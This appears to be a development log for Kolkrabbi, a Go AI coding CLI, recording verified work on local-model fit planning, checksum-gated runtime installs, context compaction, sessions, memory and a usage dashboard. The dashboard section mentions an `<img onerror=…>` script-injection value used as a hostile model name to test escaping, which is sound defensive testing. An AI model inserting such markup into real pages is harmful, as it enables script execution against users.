- Confirmation and the hint are each `sync.Once`: the manifest is not rewritten every turn, and a
  failing connector does not repeat itself down the transcript.
- Writing the confirmation is best effort. A session that works must never fail because a note about
  it could not be written.
- `Close` forwards to the wrapped provider, so the retired-backend release from B12.10 still works
  through the decorator.

Non-goals:

- No demotion, and no provider error-text taxonomy. If a demotion path is ever wanted it needs a
  typed signal from the provider, not a string match.

Acceptance checklist:

- [x] red first: `verifyingBackend` did not exist and an answered turn left the connector unverified.
- [x] an answered turn records `verified: true`.
- [x] a failed turn returns the underlying error, prints the login command, and leaves `enabled` and
  `verified` exactly as they were.
- [x] three answered turns write one connector; three failed turns print the hint once.
- [x] `newAgent` and `/model` both hand back a wrapped backend around `*agentcli.ClaudeBackend`.
- [x] `go test -race ./internal/cli` and full `make check` green.

### L13.4a hardware snapshot & fit planner — verified detail

`docs/plan/25-managed-local-models.md` fixes the snapshot shape and the rules around it. This leaf
implements both as pure code, so every rule is testable without a GPU, an Ollama install, or a
probe.

The shape's important property is that a byte count can be *unknown*. `Capacity{Bytes, Known}` keeps
that distinct from zero: zero is a fact about the machine, unknown is the absence of one, and the
contract says a missing probe must never authorize a pull. Every refusal carries the numbers it
rested on, because "it does not fit" without them is not actionable.

Decisions, each one a test:

- **Unknown refuses.** Unknown free disk, unknown system RAM, or unknown available VRAM on the
  chosen card all refuse rather than assume.
- **Disk is checked before anything is downloaded**, using storage size, which is separate from
  runtime need: file size alone never proves a model fits.
- **`cpu` never swaps.** A model larger than RAM minus reserved headroom is refused. Swap would make
  it "work" and then be unusably slow, which is a worse answer than no.
- **`gpu` is a choice, not a hint.** An explicit GPU that cannot hold the model is refused, naming
  the way out, instead of quietly running on the CPU and being mysteriously slow.
- **`auto` may fall back, but says so.** It picks the largest single card that fits after headroom;
  if none does, it plans the CPU and records the fallback in the plan, so a slower run is never
  discovered at inference time.
- **Cards are never pooled.** Two 8 GiB cards do not add up to 16 GiB unless the user opts in, which
  is not yet a supported option.

Non-goals:

- No probing. Reading real accelerator, RAM and disk numbers is L13.4b, and it must return this same
  shape.
- No pull, no download, no sidecar interaction, no `/localia`.

Acceptance checklist:

- [x] eight tests cover GPU fit, CPU fallback with a reported fallback, refusal instead of swap,
  explicit-GPU refusal, unknown capacity, disk shortfall, explicit GPU index, and no pooling.
- [x] refusals name the sizes that caused them.
- [x] the package still needs neither a GPU nor Ollama to test.
- [x] full `make check` green.

### L13.4b sysfs and meminfo probe — verified detail

A probe reads real machine state, which normally means tests that need a GPU. `Prober` reads through
an `fs.FS` and an injected disk-space function instead, so every branch is exercised with
`fstest.MapFS` and none of it needs hardware, `/proc`, or root.

Every read fails closed to unknown, which is the whole point: the planner refuses on unknown, so a
probe that guesses is strictly worse than one that admits it cannot tell.

Decisions, each a test:

- **`MemTotal` is parsed with its unit.** `MemTotal: 32764700` without `kB` is not the line this
  parser understands, so it is unknown rather than off by 1024.
- **An unreadable card is still listed.** NVIDIA exposes no VRAM counters in sysfs; hiding the card
  would be worse than listing it unmeasured, because the planner can refuse on unknown but cannot
  refuse on a card it never saw.
- **Connectors and render nodes are not accelerators.** `card0-DP-1` and `renderD128` sit beside
  `card0` in the same directory and would otherwise triple the card count.
- **An unrecognised vendor ID is reported raw** rather than dropped.

Non-goals:

- No disk measurement and no NVIDIA VRAM yet. Both need something this leaf deliberately does not
  reach for — a syscall behind build tags, and process execution, which only `internal/shell` may
  do. They are L13.4c.

Acceptance checklist:

- [x] seven tests: RAM parsed, RAM unknown in three ways, AMD VRAM total and available, an
  unmeasurable card still listed, connectors ignored, disk through the seam, disk unknown without one.
- [x] real-machine evidence on the development host: `MemTotal 16272760 kB` read as
  16,663,306,240 bytes (exactly ×1024), the Intel `card1` listed with unknown VRAM as expected for
  integrated graphics, and its nine connectors plus `renderD128` correctly ignored.
- [x] the package still needs neither a GPU nor Ollama to test.
- [x] full `make check` green.

### L13.4c disk space and NVIDIA VRAM — verified detail

The two measurements the pure probe could not make: free disk space needs a syscall, and NVIDIA
cards expose no VRAM counters in sysfs at all.

**Free space** is `internal/diskspace`, a new L0 platform package. The first attempt put the
build-tagged files in `internal/local` and the architecture gate rejected it — *"OS-divergent but
sits in L5 adapter; put the divergence behind an interface in the platform layer"* — which is
exactly right, and is the rule doing its job. It reports space available to an unprivileged writer
(`Bavail`), not `Bfree`, which counts blocks reserved for root and would promise space Kolkrabbi
cannot use. Platforms without a verified implementation return unknown, so the planner refuses
rather than pulling on a promise nobody checked.

**NVIDIA VRAM** comes from `nvidia-smi --query-gpu=name,memory.total,memory.used`, run through
`internal/shell`, the one package allowed to execute anything. The merge rule is the careful part:
the vendor tool's lines are applied only when their count matches the number of unmeasured NVIDIA
cards found in sysfs. With any other count, which line describes which card is unknowable, and
putting one card's VRAM on another would let the planner approve a model that cannot load. Unknown
refuses; a wrong number approves.

Anything not exactly in the expected CSV shape is dropped rather than interpreted, so a driver error
printed on stdout — `Failed to initialize NVML: Driver/library version mismatch` — cannot become a
measurement.

Non-goals:

- No Windows implementation. `x/sys/windows` could provide one, but untested code that claims a
  capability is worse than an honest unknown, and the managed sidecar is not supported there yet.

Acceptance checklist:

- [x] `Free` measures a real directory and reports unknown for a path that is not there.
- [x] the vendor tool's MiB values become bytes and available is total minus used.
- [x] a count mismatch leaves every card unknown rather than guessing an assignment.
- [x] a driver error line is not parsed as a measurement, and the sysfs name is kept.
- [x] the vendor tool is not consulted when no NVIDIA card is present.
- [x] `NewSystemProber` wires filesystem, statfs and vendor tool, and produces a snapshot on this
  machine with no GPU, driver, or privileged access.
- [x] full `make check` green, including the architecture gate that forced the platform move.

### L13.5a `localia` status — verified detail

The first thing that makes L13 reachable. `kolk localia` and `/localia` print what this machine
could run, where Kolkrabbi keeps local models, and what is installed. It reads only: nothing here
downloads, starts a sidecar, or writes configuration, because the contract says every pull is an
explicit user action.

Unknown stays visibly unknown in the output. A card Kolkrabbi could not measure prints `unknown`,
never `0 B`, which would read as a fact about the machine.

A real run on the development host exposed a defect the unit tests could not: free disk read
`unknown`, because `statfs` fails on the managed model directory, which does not exist until the
first pull. Reporting the destination as unmeasurable would have made the planner refuse every pull
forever. `diskspace.Free` now measures the nearest existing ancestor — the filesystem the directory
will actually occupy, which is the number the decision needs.

Scope:

- `localia` in the command table and `/localia` in the slash table, covered by the existing parity
  test.
- The probe is injectable, so the tests need neither a GPU nor Ollama, and the default wires
  `local.NewSystemProber`.
- `local.HumanBytes` is exported: sizes here decide whether a multi-gigabyte download is worth
  starting, so they are read by a person.

Non-goals:

- No catalog, no pull, no sidecar start, no GPU configuration. L13.5b and L13.5c own those, and
  keeping them out is what lets this leaf be read-only.

Acceptance checklist:

- [x] hardware, storage, model directory and installed models are reported.
- [x] an unmeasured card prints `unknown`.
- [x] an empty managed directory says nothing is installed and that Kolkrabbi never pulls on its own.
- [x] `/localia` mirrors the command.
- [x] the default probe path runs on a machine with no GPU and no Ollama.
- [x] real-binary run on the development host: 15.5 GiB RAM, 7.7 GiB free where `df` reports 7.8 G,
  the Intel card listed as unmeasurable, and no models installed.
- [x] full `make check` green.

### L13.5c GPU and quantization settings — verified detail

The contract names five persisted values: `gpu_mode`, `gpu_index`, `quantization`,
`reserved_vram_fraction` and `reserved_ram_bytes`. They live in the config file Kolkrabbi already
has, as `local.*` keys, rather than a second settings file — one config surface means `kolk config`
already knows how to read, write and remove them, and there is one answer to "where do my settings
live?".

Two shapes matter here:

- **The numeric fields are pointers.** Their zero values are meaningful — GPU 0 is a real card, and
  reserving zero headroom is a deliberate choice — so "set to zero" and "never chosen" must not be
  the same state.
- **Validation happens where the value is typed.** `local.gpu_mode turbo` fails immediately with the
  three valid modes, rather than being stored and surfacing much later as a refused pull with no
  obvious cause. `reserved_vram_fraction` must be at least 0 and below 1, because reserving all of
  it leaves nothing to run in: that setting could only ever refuse every model.

`ParseBytes` accepts `4GiB`, `4G`, `512MiB` and plain bytes, because reserved memory in raw bytes is
a number nobody types correctly. `localia` renders it back through `HumanBytes` for the same reason:
every other size on that screen is in GiB, and a raw byte count would be the one number the reader
has to convert themselves.

Non-goals:

- The planner does not read these yet. Wiring `config.LocalSettings` into `local.Config` belongs
  with the pull path in L13.5b, where a plan is actually computed.

Acceptance checklist:

- [x] gpu mode accepts auto/cpu/gpu case-insensitively, stores it normalised, and rejects anything
  else.
- [x] reserved fraction accepts 0.15 and rejects 1, 1.5, -0.1 and non-numbers.
- [x] byte sizes accept `4GiB`, `4G`, `512MiB`, `1.5GiB`, whitespace and plain bytes, and reject
  negatives, nonsense units and empty.
- [x] gpu index stores a zero and rejects a negative.
- [x] get, set and unset round-trip, and an unknown `local.*` key is rejected rather than stored.
- [x] real-binary rehearsal: three settings written to the config file, two invalid values refused
  with their reasons, and `localia` showing the stored values with `(computed)` for the rest.
- [x] full `make check` green.

### L13.5b1 catalog and plan — verified detail

`localia models` lists what Kolkrabbi knows how to plan for, and `localia plan <model>` answers
"where would this run and does it fit" without committing to anything. Seeing the plan must never be
the act that starts a multi-gigabyte download, so the two are separate verbs and the plan says so in
its last line.

Honesty about what is a fact and what is not runs through this leaf. A quantization's file size is
published and is recorded as such. Everything about runtime memory is an *estimate* derived from it
— weights plus a fifth, with a floor, because a proportional overhead alone under-counts small
models — and every place it is shown is labelled `(estimate)`. The estimate is deliberately
generous: over-estimating costs a user a model that would probably have fit, while under-estimating
costs them a multi-gigabyte download that cannot load. The catalog is deliberately short, because a
long list of models nobody sized is not more useful than a few whose sizes were checked.

A real run exposed a contract gap the unit tests could not: `available: 15.5 GiB after 0 B reserved`.
`docs/plan/25` requires defaults that reserve headroom for the operating system and for Kolkrabbi,
and the planner's zero values reserved nothing. Unset now means the documented default (2 GiB of RAM,
10% of VRAM); a user who *chooses* zero still gets zero. That distinction is exactly why the config
fields are pointers.

Scope:

- `local.Catalog`, `local.LookupModel`, and `CatalogEntry.Requirement`.
- `localia models [filter]` and `localia plan <model>`, both in the command and slash tables.
- `localRuntimeConfig` maps saved settings onto the planner's input and supplies default headroom
  for anything unset.

Non-goals:

- No download, no sidecar start, no confirmation flow. L13.5b2 owns those, and keeping them out is
  what makes this leaf safe to run on any machine.

Acceptance checklist:

- [x] the catalog filters by name, quantization and parameter count, and every entry carries a size
  and a quantization.
- [x] every runtime estimate exceeds the file on disk, and the CPU estimate exceeds the GPU one.
- [x] an unknown model names the command that lists them.
- [x] the plan prints download size, destination, disk free, placement, need, availability, reserved
  headroom and any fallback.
- [x] a model that cannot fit refuses with its sizes; configured headroom changes the outcome.
- [x] unset headroom uses the documented default; a chosen zero is respected.
- [x] real-binary rehearsal on the development host: the catalog, a CPU plan with the fallback
  explained, and `qwen2.5-coder:14b needs 8.8 GiB on disk and only 7.7 GiB is free`.
- [x] full `make check` green.

### L13.5b2 pull approval — verified detail

`localia pull <model>` plans, shows what the download costs, asks once, and only then acts. The
order is the point: a model that cannot fit is refused *before* the user is asked to approve a
download that could never have worked.

Anything that is not an explicit yes is a no, including end of input. A closed stdin must never
approve a multi-gigabyte download, which is what makes `--yes` a deliberate opt-in for scripts
rather than the accidental default of a pipeline.

The approved path stops honestly. Kolkrabbi runs its own sidecar and never touches a host
installation, so with no managed runtime installed there is nothing to pull through, and it says
exactly that and where it looked. Installing that runtime is its own approved step (L13.5b3), not a
side effect of asking for a model.

Scope:

- `localia pull [--yes] <model>`, plan → question → act.
- `local.SidecarName`, looked for only below Kolkrabbi's own directory: a binary of the same name on
  `PATH` belongs to the host and is never used.

Non-goals:

- No download and no runtime install. Those need a pinned version and a checksum that the owner has
  verified, and shipping unverified values would be worse than shipping nothing.

Acceptance checklist:

- [x] the download size and placement are shown before the question is asked.
- [x] `n` cancels, says nothing was downloaded, and exits 0 — declining is a normal outcome.
- [x] closed stdin is a decline, not approval.
- [x] a model that cannot fit is refused with its sizes and is never offered.
- [x] `--yes` skips the question.
- [x] declining creates no managed model directory.
- [x] an approved pull names the missing runtime and where it was expected.
- [x] real-binary rehearsal of decline and approve on the development host.
- [x] full `make check` green.

Correction worth recording: the first version of the cannot-fit test asserted that
`qwen2.5-coder:14b` would be refused on the fixture machine. It was not, because the fixture has
200 GiB free and a 15 GiB card — the model fits there comfortably. The test premise was wrong, not
the code, and it was fixed by giving that one test a cramped machine rather than by changing the
planner.

### L13.5b3 verified runtime install — verified detail

`InstallRuntime` places a pinned sidecar binary. Kolkrabbi starts this process itself, so this is
the one path in the product that installs an executable Kolkrabbi then runs, and it is built to
refuse rather than to cope.

- **No checksum, no fetch.** A release without a pinned SHA-256 is refused *before* anything is
  downloaded, because with nothing to verify against there is no way to judge what came back.
- **Nothing reaches the destination unverified.** The download lands in a temporary file beside the
  destination and is renamed only after the digest matches. A rejected download leaves nothing on
  disk.
- **A body larger than promised is stopped, not truncated.** Reading one byte past the declared size
  makes an oversized response its own error rather than a checksum failure with a misleading reason.
- **An install that is already correct is left alone**, so repeating the step costs nothing.
- **Nothing is executed during installation.**

The pin itself is deliberately empty, and that is the deliverable's honest edge. Filling it in means
choosing a specific upstream build and recording the checksum of bytes someone actually reviewed. A
plausible-looking URL with an unverified digest would be worse than nothing: it would turn
"verified" into a word rather than a property. `PinnedRuntime` therefore reports "no release", and a
test guards the dangerous middle state — a version and URL with no checksum reads as configured
while verifying nothing, so the pin is complete or absent, never partial.

`localia pull` says so plainly when approved:

```
this build pins no verified local runtime, so qwen2.5-coder:7b cannot be pulled;
the install path is ready and waiting for a reviewed release to be recorded
```

Acceptance checklist:

- [x] verified bytes are installed at mode 0755.
- [x] a checksum mismatch refuses, names the mismatch, and leaves nothing behind.
- [x] an unpinned release is refused without fetching at all.
- [x] a body larger than its declared size is refused, and nothing is left on disk.
- [x] three installs of the same version download once; a different binary is replaced once.
- [x] a fetch failure is surfaced with its cause intact.
- [x] the pin is complete or absent, and if present must be https with a 64-character digest.
- [x] full `make check` green.

**L13.5b4 is blocked on the owner, deliberately.** The remaining work is not code: pick an upstream
runtime release, verify it, and record its version, URL and SHA-256 in `pinnedRuntime`. Everything
around that line is written and tested.

### C12.1 context accounting — verified detail

The first leaf of [`docs/plan/12-sessions-context-memory.md`](docs/plan/12-sessions-context-memory.md).
Everything else in that document depends on knowing how full the window is, and Kolkrabbi did not
know at all: no accounting, no threshold, no display.

The distinction the type exists to keep is measured versus estimated. `Meta.PromptTokens` is the
provider's own count of what it just read; a character estimate is a floor for the one moment before
any turn has been answered. Compaction throws conversation away, so the two must never be confused
at the point that decision is made.

Decisions, each a test:

- **Unknown window never compacts.** A model the catalog does not describe reports zero, and zero
  means "no limit was stated", not "a small limit". Discarding a user's conversation on a guessed
  ceiling is worse than a provider error they can read.
- **Switching to an unlisted model returns to unknown** rather than keeping the previous model's
  number. A borrowed limit is a guess wearing a measurement's clothes.
- **The fraction is capped at 1.** A stale catalog can make a provider report more than the window
  it advertises, and showing 140% would read as a bug in Kolkrabbi rather than in the catalog. It
  still asks for compaction.
- **The footer shows it**: `[code · vendor/model · 12445 tok · 12.3k/128k ctx · 812ms]`. A user who
  can watch the window fill can see a compaction coming instead of being surprised by the model
  forgetting something. Nothing is claimed when the window is unknown.

The window is resolved once from the catalog already loaded during session construction and kept in
memory, so a `/model` switch re-resolves it without a network call — the existing
`TestSlashModelDirectSwitchDoesNotFetchCatalog` guarantee still holds.

Non-goals:

- Nothing compacts yet. C12.2 owns the compaction itself; this leaf only makes the decision
  measurable and visible.

Acceptance checklist:

- [x] a reported count wins over an estimate, and an estimate never claims to be measured.
- [x] the threshold fires at exactly 75% and not at 74.9%.
- [x] an unknown window never compacts and claims no fraction.
- [x] `128000` renders as `128k`, not `128.0k` — the decimal appears only when it carries
  information.
- [x] the footer shows usage with a window and says nothing without one.
- [x] a model switch updates the window; an unlisted model sets it back to unknown.
- [x] full `make check` green.

### C12.2a compaction transform — verified detail

The pure half of compaction: given a conversation and a token target, give up the least meaningful
content first and stop at the first stage that fits.

The constraint that shapes every stage is that the result must still be a conversation a provider
will accept. A tool result without its call, or a call without its result, fails validation before
the model ever sees it — so tool output is **emptied, not removed**, keeping the message that
carries the id, and collapsing a call means replacing the assistant message *and its results*
together with one line naming what ran. A helper asserts that invariant on the output of every
stage, because getting it wrong produces a session that is broken from the next turn onward and
looks like a provider bug.

The order of sacrifice, each stage a test:

1. **Tool output** — most of the bytes of a coding session, least of its meaning, already capped at
  12 000 characters by the tool layer. Replaced by `[tool output dropped: n chars]`, which says it
  happened rather than letting the content silently vanish.
2. **The calls themselves** — collapsed with their results into `[ran: bash, read_file]`, so the
  model still knows work happened and what kind.
3. **One summary** of everything older, generated through the injected summarizer.

The system prompt and the most recent turns are never touched: recent turns are what the model needs
most, and re-deriving the system prompt from a summary would change the agent's own instructions.
With no summarizer available the transform reports the stage it actually reached rather than
claiming one that never ran.

Correction recorded: the first version of three tests used token targets that no amount of head
compaction could reach, because the *kept* recent turns alone exceeded them. The transform correctly
escalated and the tests read that as choosing the wrong stage. The fixture was resized so each stage
is genuinely reachable — the second time this session a test premise, not the code, was wrong.

Non-goals:

- Nothing calls this yet. C12.2b wires it into the turn loop with the snapshot, the visible line, and
  the overflow retry.

Acceptance checklist:

- [x] tool output goes first and says so; recent turns stay verbatim.
- [x] the system prompt survives every stage.
- [x] calls collapse only when dropping output is not enough, and still record what ran.
- [x] compaction stops at the first stage that fits, making no model call when it does not need one.
- [x] the summary stage labels itself, keeps its content, and is reached only last.
- [x] a summarizer failure is surfaced with its cause.
- [x] a short session is left untouched.
- [x] every stage's output passes the tool-call well-formedness check.
- [x] `go test -race ./internal/engine` and full `make check` green.

### C12.2b compaction in the turn loop — verified detail

Compaction now runs, at exactly one place: the start of a turn, before anything is sent. Never
during one. Compacting between a tool call and its result would orphan the call, which is the exact
damage A10's session repair exists to undo, and it would be caused by the feature meant to keep
sessions healthy.

Three properties the tests pin down:

- **It aims below the threshold, not at it.** Shrinking to 75% would compact again on the very next
  turn; halving the window buys real room for the cost of one summary.
- **It is reversible.** The replaced conversation is kept so the step can be undone within the
  session, because compaction is the one operation that makes the model forget. A second undo
  reports that there is nothing left rather than silently succeeding.
- **It is never silent.** `compacted 14 messages (tool results), freeing about 9000 tokens` prints
  every time. A user who cannot see this happen cannot explain why the model suddenly forgot
  something, and would reasonably file it as a bug.

Failure is non-fatal throughout. A session that cannot be compacted, or cannot be saved after being
compacted, still tries its turn and lets the provider answer or refuse — the alternative is a tool
that stops working because its optimisation failed.

The summary comes from the fast lane (M8.4), which is what that slot was built for and is zero-cost
whenever the session model is free. The prompt asks for goal, decisions, files, commands that still
matter, and open work, in that order, and explicitly discards conversational texture.

Non-goals:

- No durable pre-compaction file yet, so undo is session-scoped; C12.2c owns that alongside
  `/compact`, `/rewind --compact`, and the overflow retry.

Acceptance checklist:

- [x] a window with room is left alone, silently.
- [x] a filling window shrinks, stays well-formed, and prints what it gave up.
- [x] the compaction can be undone, and a second undo is a no-op rather than a lie.
- [x] an unknown window never compacts however full the session looks.
- [x] `go test -race ./internal/engine ./internal/cli` and full `make check` green.

### C12.2c overflow recovery and `/compact` — verified detail

Two things close the compaction work.

**A refusal for length is now recoverable.** It is the one provider failure Kolkrabbi can actually
do something about, and it used to end the turn. `IsContextOverflow` classifies it and the turn
compacts and asks again — exactly once. A second refusal after compacting means the request cannot
be made to fit, and retrying again would spend money to fail the same way.

There is no typed signal for this in an OpenAI-compatible API, so it is matched on text, and that
heuristic is defensible here for a reason worth recording: a false positive costs one compaction and
one retry, both visible and both reversible, while a false negative merely leaves today's behaviour.
Nothing is disabled and nothing is lost either way. This is the opposite of the P11.7b situation,
where a false positive would have disabled a working connector — which is why that one refuses to
guess and this one does.

**`/compact` puts the control in the user's hands**, with `/compact undo` beside it. Every path says
what it did: it compacted and how to reverse it, or it restored, or there was nothing to compact and
the recent turns are kept as they are.

Acceptance checklist:

- [x] the usual provider phrasings are recognised, including one that appears only in the raw body,
  and 413 as well as 400.
- [x] rate limits, auth failures, unknown models and network errors are not mistaken for it.
- [x] a real turn recovers: the provider is called twice, the second request is measurably smaller,
  and the recovery is explained in the transcript.
- [x] a request that cannot be made to fit fails after exactly one retry.
- [x] `/compact` shrinks on demand and tells the user how to undo; `/compact undo` restores.
- [x] undo with nothing to undo, and `/compact` on a short session, both say so honestly.
- [x] `go test -race ./internal/engine ./internal/cli` and full `make check` green.

Remaining in the item 12 design, not yet built: the durable pre-compaction file (undo is
session-scoped today), `sessions search/rename/fork/export`, cwd-aware resume, fast-lane auto-titling,
and the user-level memory layer.

### C12.3 session commands — verified detail

`kolk sessions` could list, delete and clear. It gained the four verbs the item 12 design named, each
chosen because it matches how a session is actually remembered or reused.

- **`search <text>`** matches titles *and message content*, because nobody remembers a session by its
  ULID. A search with no matches says so and exits 0: finding nothing is an answer, not a failure.
- **`rename <id> <title>`** replaces the auto-title, which is derived from the first thing typed and
  is often the least descriptive sentence of the session.
- **`fork <id>`** copies the history into a new session and prints the id to resume. The original is
  never touched — forking exists precisely so an experiment cannot damage the history it started
  from, and a test asserts the original is unchanged rather than merely that a fork appeared.
- **`export <id> [--json]`** renders Markdown by default with tool bodies elided, since they are the
  bulk of a coding session and the least readable part of it. `--json` is the stored record,
  unaltered, for anything else that wants to read it.

A real run caught the last defect: `sessions export nope` reported
`open /tmp/.../sessions/nope.json: no such file or directory`. A mistyped id is an ordinary mistake,
not a filesystem fault, and it now reads `no session "nope"; \`kolk sessions\` lists them`. The test
asserts both halves — that the guidance is there, and that no internal path the user never typed
appears in the message.

Acceptance checklist:

- [x] search matches content as well as titles, is case-insensitive, and reports no matches honestly.
- [x] rename persists and confirms.
- [x] fork carries the history, leaves the original byte-identical, and prints the id to resume with.
- [x] Markdown export is readable and elides tool bodies; `--json` is the stored record.
- [x] all three id-taking verbs reject an unknown id with guidance and without a path.
- [x] full `make check` green.

### C12.4 project-aware resume — verified detail

`kolk -r` resumed whatever was typed last anywhere. Standing in a directory and asking to resume
means the work done *here*, not whatever happened in another window, and on a machine with several
projects the old behaviour reliably resumed the wrong one.

Sessions now record the directory they were started in, and resume prefers this project's most
recent session before falling back to the newest overall.

Two details that matter more than they look:

- **A session with no recorded directory matches nothing.** Sessions written before this field
  existed have none, and treating empty as a wildcard would let one old session hijack resume in
  every directory on the machine. They stay reachable through the fallback and by `-s`.
- **Directories are compared through symlinks**, so `/tmp` and `/private/tmp` are one project rather
  than two — the difference between a resume that works on macOS and one that silently does not.

Reaching into another project is legitimate but surprising, so it is stated —
`resuming a session started in /home/me/other` — rather than left to be inferred from a transcript
about unfamiliar code.

Acceptance checklist:

- [x] a new session records where it was started.
- [x] this project's session wins over a newer one from elsewhere.
- [x] the newest overall is used when this project has none.
- [x] a session written before the field existed is reachable only through the fallback.
- [x] no sessions is not an error.
- [x] resuming across projects names the other directory.
- [x] the frozen v0 session fixture still loads unchanged.
- [x] full `make check` green.

### C12.5 memory layers and `/remember` — verified detail

Kolkrabbi had one memory layer, the project file in the working directory. Standing preferences that
belong to a person rather than a repository had nowhere to live, so they were retyped every session
or written into somebody's project file.

`<config>/memory.md` is the user layer. Both are appended to the system prompt with the user's notes
first and the project's second, so a project statement wins a contradiction by being nearer the task.

**Only the user writes memory.** `/remember [--project] <note>` appends one line and says what it
wrote and where; an empty note is refused rather than written. There is deliberately no tool for
this: an agent that can edit its own standing instructions unprompted is an agent whose behaviour
cannot be explained by reading the repository. `--project` appends to the file the engine already
loads rather than creating a second one beside it, which a test asserts explicitly.

Two defects fixed while here, both in code that predates this leaf:

- **Truncation cut at a byte offset**, which can split a UTF-8 rune. An oversized memory file
  therefore put invalid bytes into *every request the session made* — a corrupt prompt rather than a
  long one. The cut now lands on a line boundary and the test uses multibyte content specifically to
  prove it.
- **Truncation was silent.** Notes that stop being followed halfway down a file are impossible to
  debug from outside, so the cut now says `[truncated: <path> is larger than 16384 bytes]`.

Acceptance checklist:

- [x] both layers reach the system prompt, in the documented order.
- [x] no memory means an unchanged prompt.
- [x] an oversized file is cut at a line boundary, stays valid UTF-8, and announces the cut.
- [x] `/remember` writes to the user layer and names the file.
- [x] `/remember --project` writes to the file already in use and creates no second one.
- [x] notes append rather than replace; an empty note writes nothing at all.
- [x] `go test -race ./internal/engine ./internal/cli` and full `make check` green.

**Item 12 is now built except the durable pre-compaction file and fast-lane auto-titling**, both
recorded as remaining.

### C12.6 durable compaction archive — verified detail

C12.2b made compaction reversible for the life of the process. The item 12 design promised more than
that, and the gap mattered: a session compacted in the morning and reopened in the afternoon had
lost the conversation permanently, with nothing on disk to go back to.

Each compaction now writes what it replaced to `<id>.pre-compact-<n>.json`, numbered and never
overwritten — a second compaction must not erase the record of the first, which is the one a user is
most likely to want back. The path is printed with the compaction line, because an undo nobody can
locate is not reversibility.

Neither archiving failure stops the work. If the archive cannot be written the compaction still
happens, says why, and in-memory undo still works: the session *had* to fit, and losing the archive
costs reversibility beyond this process rather than the ability to keep working.

**The consequence worth catching:** an archive holds the conversation that was replaced, so a
deleted session that left one behind would still be readable on disk. `session.Delete` now removes a
session's archives with it, and `Clear` inherits that by delegating. A test proves another session's
archives are untouched, because a glob that deletes too much is a worse bug than one that deletes too
little.

The engine does not touch the filesystem for this: it calls an injected archiver and the surface owns
where files go, which is the same seam every other storage decision in this codebase uses.

Acceptance checklist:

- [x] the replaced conversation is archived and the path is named in the output.
- [x] a failed archive is reported, does not stop the compaction, and leaves in-memory undo working.
- [x] archives are numbered and never overwrite an earlier one, bounded per session.
- [x] deleting a session deletes its archives; another session's are left alone.
- [x] `go test -race ./internal/engine ./internal/cli ./internal/session` and full `make check` green.

Item 12 is now built except fast-lane auto-titling, which is recorded as the one remaining piece.

### D17.1 resilient usage log — verified detail

The item 17 doc flagged this as a risk before any dashboard code was written, and the check found it
real. `stats.Load` already skipped malformed JSON, but two things were wrong underneath that.

- **An over-long line failed the entire load.** The scanner returned `bufio.ErrTooLong`, `Load`
  returned the error, and every record the user had became unreadable. One interrupted append —
  a power cut mid-write is the obvious case — could cost a year of history. Reading now discards
  only the unreadable line and continues with the next.
- **Skipping was silent.** A history quietly missing records produces totals that are wrong in a way
  nobody can detect, which is worse than no totals: the number looks authoritative. `LoadCounted`
  reports how many lines it could not read and `kolk stats` says the totals are incomplete when any
  were.

Blank lines are not counted as loss — they are formatting, not missing data, and inflating the
warning would teach the user to ignore it.

This lands before the dashboard deliberately. Every number the dashboard will draw comes through
this loader, and a chart built on a silently truncated history is exactly the class of confidently
wrong output that B12.11 already produced once.

Acceptance checklist:

- [x] a malformed line is skipped, the records either side load, and the skip is counted.
- [x] a line too long to scan is skipped rather than failing the load, with the records on both
  sides intact.
- [x] blank lines are not counted as loss.
- [x] a missing file is still not an error, and `Load`'s original signature still works.
- [x] `kolk stats` declares incomplete totals, and stays silent when nothing was skipped.
- [x] full `make check` green, lint 0 issues.

### D17.2 `kolk dash` — verified detail

The dashboard the product has promised since its README. It renders three views from the same
`stats.jsonl` that `kolk stats` reads, through the same functions, so the two surfaces can be wrong
together but can never disagree.

Everything is drawn on the server. The page contains no `<script>`, loads nothing, and declares that
to the browser with `default-src 'none'` — a page that needs scripting to show a number shows
nothing in half the places it is opened, and a chart library would be a vendored third-party asset
with an update obligation for three static charts.

Decisions, each a test:

- **Loopback only, and no flag to defeat it.** This page is a record of everything the user has
  worked on. A non-loopback address is refused *with the reason*, because a limit that does not
  explain itself is one somebody goes looking for a way around.
- **Port 0 by default.** A second instance never collides with the first, and there is no
  predictable port sitting open on a shared machine. The bound URL is printed.
- **Model names are escaped.** They come from a provider catalog, which Kolkrabbi does not control,
  and the test uses an `<img onerror=…>` id specifically.
- **The empty state is a screen, not an empty axis.** A new user sees what will appear here and how
  to produce it.
- **Ratings show their sample size.** `5.0★ (1)` is not a ranking; hiding the count invites reading
  it as one.
- **Incomplete totals say so**, carrying D17.1's skipped count onto the page.
- **`Cache-Control: no-store`**, so a record of the user's work does not sit in a browser cache.

The page is also checked for well-formed markup by parsing it, because hand-built HTML is easy to
get subtly wrong and browsers hide exactly that.

Verified against the development host's real usage log: the leaderboard, the daily spend chart and
the effort/mode breakdown all rendered with real figures over HTTP. Binary grew 7.91 MB → 8.43 MB,
well inside the 12 MB soft budget, and cold start is unchanged at 2.9 ms.

Known wart, not fixed here: historical records carry both canonical and legacy effort names, so
`medium` and `standard` appear as separate rows in the breakdown. They are the same level and should
be folded through `engine.NormalizeEffort`.

Acceptance checklist:

- [x] the page shows the leaderboard, a daily spend chart and the effort/mode breakdown.
- [x] no script tag; an SVG chart is present.
- [x] the markup parses.
- [x] a hostile model name is escaped.
- [x] no data produces an explanatory screen rather than an empty chart.
- [x] a skipped-line count reaches the page.
- [x] every non-loopback spelling is refused with its reason; loopback spellings are accepted.
- [x] the handler serves the page, sets CSP and no-store, 404s anything else, and works on a machine
  with no usage yet.
- [x] real-binary rehearsal over HTTP against real data; full `make check` green, lint 0 issues.

### D17.3 effort folding & recent sessions — verified detail

Two things the first dashboard got wrong, one of them recorded as a known wart at the time.

**One effort level was appearing as two rows.** E7.1 renamed `quick/standard/deep/ultra` to
`low/medium/high/max`, and a usage log that spans that change contains both spellings for the same
level. The breakdown split one level's spend across two rows that looked like two levels — a chart
that misleads about the very question it exists to answer. Efforts are now folded through
`engine.NormalizeEffort` before aggregating; on the development host's real log, `medium` and
`standard` merged into one `$0.52` row and `ultra` became `max`.

**Recent sessions** answers the drill-down question the item 17 doc named: what did each session
cost, on which models, and when. Records written before sessions were tagged carry no id, and a row
nobody can identify is a row nobody can act on, so they are omitted entirely rather than shown blank
— a test asserts an untagged history produces no table at all rather than an empty one. The list is
capped at twenty with a pointer to `kolk sessions`, since a dashboard that reproduces a full listing
is just a worse listing.

Worth recording: `internal/arch/layers.go` already forbids `modernc.org/sqlite` inside
`internal/dash`. The architecture ratchet had reached the same conclusion as the item 17 measurement
